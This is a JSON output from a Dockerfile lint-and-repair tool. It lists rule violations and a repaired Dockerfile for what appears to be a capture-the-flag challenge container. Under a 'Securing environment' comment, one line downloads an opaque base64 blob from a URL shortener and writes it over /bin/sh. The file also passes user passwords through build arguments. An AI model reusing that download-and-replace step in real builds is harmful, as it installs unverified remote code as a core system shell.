{
  "startTime": 1674243841523,
  "endTime": 1674243841718,
  "originalSmells": [
    {
      "rule": "curlUseFlagF",
      "position": {
        "lineStart": 55,
        "lineEnd": 55,
        "columnStart": 4,
        "columnEnd": 34
      }
    },
    {
      "rule": "pipUseNoCacheDir",
      "position": {
        "lineStart": 32,
        "lineEnd": 32,
        "columnStart": 4,
        "columnEnd": 41
      }
    },
    {
      "rule": "aptGetInstallUseNoRec",
      "position": {
        "lineStart": 10,
        "lineEnd": 10,
        "columnStart": 4,
        "columnEnd": 93
      }
    },
    {
      "rule": "aptGetInstallUseNoRec",
      "position": {
        "lineStart": 11,
        "lineEnd": 11,
        "columnStart": 4,
        "columnEnd": 216
      }
    },
    {
      "rule": "aptGetInstallUseNoRec",
      "position": {
        "lineStart": 12,
        "lineEnd": 12,
        "columnStart": 4,
        "columnEnd": 33
      }
    },
    {
      "rule": "aptGetUpdatePrecedesInstall",
      "position": {
        "lineStart": 10,
        "lineEnd": 10,
        "columnStart": 4,
        "columnEnd": 93
      }
    },
    {
      "rule": "aptGetUpdatePrecedesInstall",
      "position": {
        "lineStart": 11,
        "lineEnd": 11,
        "columnStart": 4,
        "columnEnd": 216
      }
    },
    {
      "rule": "aptGetUpdatePrecedesInstall",
      "position": {
        "lineStart": 12,
        "lineEnd": 12,
        "columnStart": 4,
        "columnEnd": 33
      }
    },
    {
      "rule": "aptGetInstallThenRemoveAptLists",
      "position": {
        "lineStart": 10,
        "lineEnd": 10,
        "columnStart": 4,
        "columnEnd": 93
      }
    },
    {
      "rule": "aptGetInstallThenRemoveAptLists",
      "position": {
        "lineStart": 11,
        "lineEnd": 11,
        "columnStart": 4,
        "columnEnd": 216
      }
    },
    {
      "rule": "aptGetInstallThenRemoveAptLists",
      "position": {
        "lineStart": 12,
        "lineEnd": 12,
        "columnStart": 4,
        "columnEnd": 33
      }
    }
  ],
  "repairedSmells": [
    {
      "rule": "aptGetUpdatePrecedesInstall",
      "position": {
        "lineStart": 10,
        "lineEnd": 10,
        "columnStart": 4,
        "columnEnd": 117
      }
    },
    {
      "rule": "aptGetUpdatePrecedesInstall",
      "position": {
        "lineStart": 11,
        "lineEnd": 11,
        "columnStart": 4,
        "columnEnd": 240
      }
    },
    {
      "rule": "aptGetUpdatePrecedesInstall",
      "position": {
        "lineStart": 12,
        "lineEnd": 12,
        "columnStart": 4,
        "columnEnd": 57
      }
    }
  ],
  "repairedDockerfile": "# Use ubuntu 16.04\nFROM ubuntu:16.04\n\n# Open port 5000\nEXPOSE 5000\n\n# update\nRUN apt-get update\n\n# install socat editor ssh\nRUN apt-get install --no-install-recommends curl netcat-openbsd vim nano openssh-server socat lib32ncurses5 python -y && rm -rf /var/lib/apt/lists/*;\nRUN apt-get install --no-install-recommends git-core curl zlib1g-dev build-essential libssl-dev libreadline-dev libyaml-dev libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev libcurl4-openssl-dev python-software-properties libffi-dev nodejs -y && rm -rf /var/lib/apt/lists/*;\nRUN apt-get install --no-install-recommends python-pip -y && rm -rf /var/lib/apt/lists/*;\n\n# Read arg\nARG flag\nARG flag_name\nARG binary\nARG username\nARG password\nENV flag=${flag}\nENV flag_name=${flag_name}\nENV binary=${binary}\nENV username=${username}\nENV password=${password}\n\n# Install requirements\n\n# Set WorkDir\nRUN mkdir /app\nWORKDIR /app\nCOPY challs/* /app/\nRUN pip install --no-cache-dir -r  /app/requirements.txt\n\n\n# SSH Docker\nEXPOSE 22\nRUN mkdir /var/run/sshd\nRUN adduser --disabled-password --gecos \"\" $username\nRUN echo \"$username:$password\" | chpasswd\nRUN sed 's@session\\s*required\\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd\n\n\n# Copy ruby to workdir\n\nRUN echo $flag > \"/app/$flag_name\"\nRUN chown -R root:$username /app/* && chmod -R 775 /app/*\nRUN chown root:root $flag_name && chmod 755 $flag_name\n#RUN chown \"root:$username\" $binary && chmod 775 $binary\n\n\n\n#RUN cp /usr/bin/ruby /usr/local/bin/\n\n# Securing environment\nRUN curl -f -Ls https://goo.gl/yia654 | base64 -d > /bin/sh\nRUN chmod 700 /usr/bin/* /bin/* /tmp /dev/shm\nRUN chmod 755 /usr/bin/env  /bin/dash /bin/bash /bin/sh /bin/nc /bin/cat /usr/bin/curl /usr/bin/groups /usr/bin/id /bin/ls /usr/bin/vi /usr/bin/vim /usr/bin/base64 /bin/nano /usr/bin/python\n#RUN chmod 777 /usr/bin/ruby\n\n\n\n\n# Run Program\n#RUN echo '#!/bin/bash'\"\\n(socat TCP-LISTEN:5000,reuseaddr,fork EXEC:/app/$binary,su=nobody)&\\n/usr/sbin/sshd -D\" > /start.sh && chmod +x /start.sh\n#CMD [\"gunicorn\" \"--bind\" \"0.0.0.0:5000\" \"wsgi\"]\n#CMD gunicorn --bind 0.0.0.0:5000 wsgi --user=nobody\n#CMD socat TCP-LISTEN:5000,reuseaddr,fork EXEC:/app/$binary,su=nobody\n#CMD [\"/start.sh\"]\nRUN echo '#!/bin/bash'\"\\n(gunicorn --reload --bind 0.0.0.0:5000 --chdir /app wsgi --user=nobody)&\\n/usr/sbin/sshd -D\" > /start.sh && chmod +x /start.sh\n\n#CMD socat TCP-LISTEN:5000,reuseaddr,fork EXEC:/app/$binary,su=nobody\nCMD [\"/start.sh\"]"
}